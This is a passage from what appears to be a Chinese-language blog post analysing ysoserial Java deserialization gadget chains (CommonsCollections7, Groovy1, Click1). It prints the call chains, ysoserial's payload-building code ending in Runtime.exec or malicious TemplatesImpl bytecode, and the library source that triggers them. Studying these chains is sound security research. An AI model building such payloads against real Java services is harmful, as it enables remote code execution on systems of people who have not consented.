<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    Hashtable.readObject</span><br><span class="line">        Hashtable.reconstitutionPut</span><br><span class="line">            AbstractMapDecorator.equals</span><br><span class="line">                AbstractMap.equals</span><br><span class="line">                    LazyMap.get</span><br><span class="line">                        ChainedTransformer.transform</span><br><span class="line">                            InvokerTransformer.transform</span><br><span class="line">                                Method.invoke</span><br><span class="line">                                DelegatingMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke</span><br><span class="line">                                NativeMethodAccessorImpl.invoke0</span><br><span class="line">                                Runtime.exec</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/PAvzWR9u3k1VKSM.png" >

<p>ysoserial.payloads.CommonsCollections7#getObject 首先构造 ChainedTransformer（同CC1），然后创建两个 LazyMap 作为 HashTable 的元素（<code>&quot;yy&quot;.hashCode() == &quot;zZ&quot;.hashCode()</code>），最后将第二个 LazyMap 中的元素移除。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Hashtable <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">    <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> String[]&#123;command&#125;;</span><br><span class="line">    <span class="keyword">final</span> Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[]&#123;&#125;);</span><br><span class="line">    <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">            execArgs),</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建 LazyMap 作为 Hashtable 的元素</span></span><br><span class="line">    Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">    Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">    Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    hashtable.put(lazyMap1, <span class="number">1</span>); <span class="comment">// 没有值，直接存</span></span><br><span class="line">    hashtable.put(lazyMap2, <span class="number">2</span>); <span class="comment">// 有值，比较后再存</span></span><br><span class="line">    Reflections.setFieldValue(transformerChain, <span class="string">&quot;iTransformers&quot;</span>, transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">    lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hashtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用两次 put 方法放入两个 LazyMap</p>
<ul>
<li>反序列化时，readObject 实际调用的是 reconstitutionPut</li>
<li>第一次调用时，会把 key 和 value 注册到 tab 中</li>
<li>第二次调用时，tab 中有内容则进入 for 循环中，从而调用 equals 方法</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the number of elements and then all the key/value objects</span></span><br><span class="line"><span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        K key = (K)s.readObject();</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        V value = (V)s.readObject();</span><br><span class="line">    <span class="comment">// sync is eliminated for performance</span></span><br><span class="line">    reconstitutionPut(table, key, value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> StreamCorruptedException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="keyword">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> Entry&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>HashTable#put 在 table 中有元素时会调用 equals 方法，当调用完毕后，lazyMap2 的 key 中就会增加一个键为 yy，值为 UNIXProcess 实例的元素，而 UNIXProcess 没有继承 Serializable，无法序列化，因此需要移除。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Make sure the value is not null</span></span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    Entry&lt;?,?&gt; tab[] = table;</span><br><span class="line">    <span class="keyword">int</span> hash = key.hashCode();</span><br><span class="line">    <span class="keyword">int</span> index = (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];</span><br><span class="line">    <span class="keyword">for</span>(; entry != <span class="keyword">null</span> ; entry = entry.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;</span><br><span class="line">            V old = entry.value;</span><br><span class="line">            entry.value = value;</span><br><span class="line">            <span class="keyword">return</span> old;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    addEntry(hash, key, value, index);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Groovy1"><a href="#Groovy1" class="headerlink" title="Groovy1"></a>Groovy1</h2><blockquote>
<p>Groovy 中使用 <code>&quot;command&quot;.execute()</code> 执行命令<br>用 MethodClosure 承载指令，用于实例化 ConvertedClosure<br>使用 ConvertedClosure 创建 Map 类型代理</p>
<ul>
<li>ConvertedClosure 的父类 ConversionHandler 实现 InvocationHandler，并重写了 invoke 方法<br>创建 AnnotationInvocationHandler 代理，在反序列化代理时，会对 memberValues 调用 map.entrySet，进一步调用 ConversionHandler.invoke 方法，实际调用 ConvertedClosure.invokeCustom，最后调用 MethodClosure 父类 Closure.call 方法</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invokeCustom</span><span class="params">(Object proxy, Method method, Object[] args)</span></span></span><br><span class="line"><span class="function"><span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (methodName!=<span class="keyword">null</span> &amp;&amp; !methodName.equals(method.getName())) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> ((Closure) getDelegate()).call(args);<span class="comment">//传入的是MethodClosure</span></span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	ObjectInputStream.readObject()</span><br><span class="line">        AnnotationInvocationHandler.readObject()</span><br><span class="line">            Map(Proxy).entrySet()</span><br><span class="line">                ConversionHandler.invoke()</span><br><span class="line">                    ConvertedClosure.invokeCustom()</span><br><span class="line">					    MethodClosure.call()</span><br><span class="line">						    ...</span><br><span class="line">					  		    Method.invoke()</span><br><span class="line">								    Runtime.exec()</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/A6MvdZRs8qPpF3Y.png" >

<p>ysoserial.payloads.Groovy1#getObject 首选利用 MethodClosure 承载要执行的指令，然后构造 ConvertedClosure，再用于实例化 AnnotationInvocationHandler 代理，最后返回的是代理对象。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// MethodClosure -&gt; 父类 ConversionHandler.delegate</span></span><br><span class="line">    <span class="comment">// &quot;entrySet&quot; -&gt; ConvertedClosure.methodName</span></span><br><span class="line">	<span class="keyword">final</span> ConvertedClosure closure = <span class="keyword">new</span> ConvertedClosure(<span class="keyword">new</span> MethodClosure(command, <span class="string">&quot;execute&quot;</span>), <span class="string">&quot;entrySet&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用 ConvertedClosure 创建 Map 类型的代理对象</span></span><br><span class="line">	<span class="keyword">final</span> Map map = Gadgets.createProxy(closure, Map.class);</span><br><span class="line">    <span class="comment">// 利用反射机制创建 AnnotationInvocationHandler 代理，将 map 保存到 memberValues 属性中</span></span><br><span class="line">	<span class="keyword">final</span> InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(map);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> handler;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Click1"><a href="#Click1" class="headerlink" title="Click1"></a>Click1</h2><blockquote>
<p>Web 应用框架<br>和 CC2 类似思路</p>
<ul>
<li>利用 TemplatesImpl 承载恶意调用链</li>
<li>PriorityQueue 在反序列化时比较元素（恢复顺序），而比较操作可以自定义<br>这里使用 Column$ColumnComparator#compare 方法</li>
</ul>
</blockquote>
<p>利用链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            Column$ColumnComparator.compare()</span><br><span class="line">                Column.getProperty()</span><br><span class="line">                  PropertyUtils.getValue()</span><br><span class="line">                    PropertyUtils.getObjectPropertyValue()</span><br><span class="line">                      Method.invoke()</span><br><span class="line">                        TemplatesImpl.getOutputProperties()</span><br><span class="line">                        ...</span><br></pre></td></tr></table></figure>

<img src="https://i.loli.net/2021/11/12/dpkRxuNwU34JQzn.png" >

<p>TemplatesImpl 类主要的作用为：</p>
<ul>
<li>使用 <code>_bytecodes</code> 成员变量存储恶意字节码 ( 恶意 class -&gt; byte array )</li>
<li>提供加载恶意字节码并触发执行的函数，加载在 <code>defineTransletClasses()</code> 方法中，方法触发为 <code>getOutputProperties()</code> 或 <code>newTransformer()</code></li>
</ul>
<p>PriorityQueue 反序列化时最后会调用 <code>heapify -&gt; siftDown</code>（将无序队列还原为优先队列），当 comparator 不为空时进一步调用 <code>siftDownUsingComparator -&gt; conparator.compare</code>，然后通过调用 Column.getProperty 进一步触发 TemplatesImpl.getOutputProperties</p>
<p>ysoserial.payloads.Click1#getObject 创建 Column$ColumnComparator 比较器，作为 PriorityQueue 的参数；先设置正常的变量值，然后设置 Column 的 name 变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// prepare a Column.comparator with mock values</span></span><br><span class="line">    <span class="keyword">final</span> Column column = <span class="keyword">new</span> Column(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line">    column.setTable(<span class="keyword">new</span> Table());</span><br><span class="line">    Comparator comparator = (Comparator) Reflections.newInstance(<span class="string">&quot;org.apache.click.control.Column$ColumnComparator&quot;</span>, column);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// create queue with numbers and our comparator</span></span><br><span class="line">    <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// stub data for replacement later</span></span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    queue.add(<span class="keyword">new</span> BigInteger(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// switch method called by the comparator,</span></span><br><span class="line">    <span class="comment">// so it will trigger getOutputProperties() when objects in the queue are compared</span></span><br><span class="line">    column.setName(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// finally, we inject and new TemplatesImpl object into the queue,</span></span><br><span class="line">    <span class="comment">// so its getOutputProperties() method will be called</span></span><br><span class="line">    <span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">    queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Column$ColumnComparator.compare 方法，其中 row1 为恶意 TemplatesImpl 对象，row2 为 <code>BigInteger(&quot;1&quot;)</code>。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Object row1, Object row2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ascendingSort = <span class="keyword">this</span>.column.getTable().isSortedAscending() ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    Object value1 = <span class="keyword">this</span>.column.getProperty(row1); <span class="comment">// 这里</span></span><br><span class="line">    Object value2 = <span class="keyword">this</span>.column.getProperty(row2);</span><br><span class="line">    <span class="keyword">if</span> (value1 <span class="keyword">instanceof</span> Comparable &amp;&amp; value2 <span class="keyword">instanceof</span> Comparable) &#123;</span><br><span class="line">        <span class="keyword">return</span> !(value1 <span class="keyword">instanceof</span> String) &amp;&amp; !(value2 <span class="keyword">instanceof</span> String) ? ((Comparable)value1).compareTo(value2) * <span class="keyword">this</span>.ascendingSort : <span class="keyword">this</span>.stringCompare(value1, value2) * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="keyword">null</span> &amp;&amp; value2 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> value1.toString().compareToIgnoreCase(value2.toString()) * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value1 != <span class="keyword">null</span> &amp;&amp; value2 == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> * <span class="keyword">this</span>.ascendingSort;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> value1 == <span class="keyword">null</span> &amp;&amp; value2 != <span class="keyword">null</span> ? -<span class="number">1</span> * <span class="keyword">this</span>.ascendingSort : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调用 this.column.getProperty(row1)，其中，调用 this.getName() 获取 Column 的 name 属性，并调用 this.getProperty(name, row)。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object row)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getProperty(<span class="keyword">this</span>.getName(), row);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为传入的 TemplatesImpl 对象不是 Map 的子类，直接跳过 if 判断，在为 methodCache 属性初始化 HashMap 类型对象后，调用 PropertyUtils.getValue(row, name, this.methodCache) 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(String name, Object row)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (row <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        Map map = (Map)row;</span><br><span class="line">        Object object = map.get(name);</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            String upperCaseName = name.toUpperCase();</span><br><span class="line">            object = map.get(upperCaseName);</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                String lowerCaseName = name.toLowerCase();</span><br><span class="line">                object = map.get(lowerCaseName);</span><br><span class="line">                <span class="keyword">return</span> object != <span class="keyword">null</span> ? object : <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 直接执行这里</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.methodCache == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.methodCache = <span class="keyword">new</span> HashMap();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> PropertyUtils.getValue(row, name, <span class="keyword">this</span>.methodCache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将传入的 name 参数值赋给 basePart 变量，并在调用 getObjectPropertyValue 方法时作为参数传入。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getValue</span><span class="params">(Object source, String name, Map cache)</span> </span>&#123;</span><br><span class="line">    String basePart = name;</span><br><span class="line">    String remainingPart = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (source <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Map)source).get(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">int</span> baseIndex = name.indexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (baseIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">            basePart = name.substring(<span class="number">0</span>, baseIndex);</span><br><span class="line">            remainingPart = name.substring(baseIndex + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        Object value = getObjectPropertyValue(source, basePart, cache);  # 这里</span><br><span class="line">        <span class="keyword">return</span> remainingPart != <span class="keyword">null</span> &amp;&amp; value != <span class="keyword">null</span> ? getValue(value, remainingPart, cache) : value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>cache 是初始化的 HashMap 对象，所以从中获取不到任何缓存方法，因此会调用 source.getClass().getMethod(ClickUtils.toGetterName(name)) 方法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title">getObjectPropertyValue</span><span class="params">(Object source, String name, Map cache)</span> </span>&#123;</span><br><span class="line">    PropertyUtils.CacheKey methodNameKey = <span class="keyword">new</span> PropertyUtils.CacheKey(source, name);</span><br><span class="line">    Method method = <span class="keyword">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        method = (Method)cache.get(methodNameKey);</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="keyword">null</span>) &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toGetterName(name));    <span class="comment">// 这里</span></span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var13) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toIsGetterName(name));</span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var11) &#123;</span><br><span class="line">            String msg;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = source.getClass().getMethod(name);</span><br><span class="line">                cache.put(methodNameKey, method);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">            &#125; <span class="keyword">catch</span> 